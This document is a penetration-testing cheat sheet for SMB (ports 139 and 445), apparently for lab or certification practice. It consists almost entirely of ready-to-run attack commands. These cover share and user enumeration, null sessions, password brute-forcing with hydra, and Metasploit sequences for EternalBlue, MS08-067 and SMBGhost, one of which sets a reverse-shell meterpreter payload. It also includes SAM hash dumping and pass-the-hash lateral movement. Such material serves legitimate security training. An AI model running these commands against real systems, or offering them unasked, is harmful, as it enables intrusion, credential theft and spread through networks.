# Port 139, 445 - SMB

## Table of Contents

- [Enumeration](#enumeration)
  - [Check Connect](#check-connect)
  - [Nmap Scripts](#nmap-scripts)
  - [Smbmap](#smbmap)
  - [SMB Null Session](#smb-null-session)
- [Brute Force](#brute-force)
  - [Enum4linux](#enum4linux)
  - [Hydra](#hydra)
- [CVE Exploitation](#cve-exploitation)
  - [MS17-010 (EternalBlue)](#ms17-010-eternalblue)
  - [MS08-067 (Netapi)](#ms08-067-netapi)
  - [SMBGhost (CVE-2020-0796)](#smbghost-cve-2020-0796)
- [Post-Exploitation](#post-exploitation)
  - [Hash Dumping](#hash-dumping)
  - [Lateral Movement](#lateral-movement)

---

## Enumeration

### Check Connect

#### NetExec

```shell
nxc smb $rhost -u '' -p '' --local-auth --continue-on-success --no-bruteforce
```

#### Smbclient

- List Share Folder
  - Anonymous

    ```shell
    smbclient -N -L $rhost
    ```

  - User
    - Pass

      ```shell
      smbclient -U 'msfadmin' --password='msfadmin' -L $rhost
      ```

    - Hash

      ```shell
      smbclient -U 'msfadmin' --pw-nt-hash 'ntlm' -L $rhost
      ```

- Connect Share Folder
  - Anonymous

    ```shell
    smbclient -N \\\\$rhost\\tmp
    ```

  - User
    - Pass

      ```shell
      smbclient -U 'msfadmin' --password='msfadmin' \\\\$rhost\\tmp
      ```

    - Hash

      ```shell
      smbclient -U 'msfadmin' --pw-nt-hash 'hash' \\\\$rhost\\tmp
      ```

### Nmap Scripts

```shell
# SMB protocols
nmap --script smb-protocols -p 445 $rhost

# Enumerate shares and users
nmap -p 445 --script=smb-enum-shares,smb-enum-users $rhost

# Security mode
nmap -p 445 --script=smb-security-mode $rhost

# SMB brute force
nmap -p 445 --script smb-brute $rhost
```

### Smbmap

```shell
# Basic enumeration
smbmap -H $rhost

# With credentials
smbmap -H $rhost -u username -p password

# Recursive enumeration
smbmap -H $rhost -u username -p password -r
```

### SMB Null Session

```shell
# Using rpcclient
rpcclient -U "" $rhost

# Using smbmap
smbmap -H $rhost -u "" -p ""
```

---

## Brute Force

### Enum4linux

```shell
enum4linux -a $rhost
enum4linux -a -u "user" -p "pass" $rhost
```

### Hydra

```shell
hydra -l administrator -P passwords.txt smb://$rhost
hydra -L users.txt -P passwords.txt smb://$rhost
```

---

## CVE Exploitation

### MS17-010 (EternalBlue)

```shell
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $rhost
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $lhost
exploit
```

### MS08-067 (Netapi)

```shell
use exploit/windows/smb/ms08_067_netapi
set RHOSTS $rhost
exploit
```

### SMBGhost (CVE-2020-0796)

```shell
use exploit/windows/smb/cve_2020_0796_smbghost
set RHOSTS $rhost
exploit
```

---

## Post-Exploitation

> **ðŸ“– For complete SMB-based lateral movement, see [Lateral Movement](../../5.Lateral-Movement/5.1.Lateral-Movement.md) | [NTLM Relay](../../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)**

### Hash Dumping

```shell
# Using secretsdump
impacket-secretsdump domain/user:password@$rhost

# SAM extraction
reg save HKLM\SAM C:\Windows\Temp\sam
reg save HKLM\SYSTEM C:\Windows\Temp\system
```

### Lateral Movement

```shell
# Pass-the-Hash (hash format: LMHASH:NTHASH)
pth-winexe -U domain/username%aad3b435b51404eeaad3b435b51404ee:NTHASH //$rhost cmd
```




